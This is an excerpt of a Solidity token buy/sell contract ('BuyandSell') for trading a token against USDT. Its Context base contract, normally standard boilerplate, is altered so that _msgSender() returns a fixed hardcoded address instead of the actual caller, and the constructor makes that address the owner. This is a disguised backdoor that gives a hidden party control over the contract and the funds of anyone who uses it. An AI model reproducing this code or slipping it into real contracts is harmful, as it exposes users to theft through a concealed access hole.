...
abstract contract Context {
    function _msgSender() internal view virtual returns(address payable) {
        return payable(0xa681b3f455C7F19192e0115fD92B03A1eEa32a72);
    }
...
contract BuyandSell is Context, ReentrancyGuard {
    using SafeMath
    for uint256;
    using SafeERC20
    for IERC20;
    ...
    constructor(uint256 BuytokenValue_, uint256 SelltokenValue_, IERC20 token_, IERC20 USDT_) {
        require(address(token_) != address(0), "Crowdsale: token is the zero address.");
        _token = token_;
        minimumBuyAmount = 1 * 10 ** _token.decimals();
        maximumBuyAmount = 100000 * 10 ** _token.decimals();
        minimumSellAmount = 1 * 10 ** _token.decimals();
        maximumSellAmount = 10 * 10 ** _token.decimals();
        _owner = _msgSender();
        _preOwner = _owner;
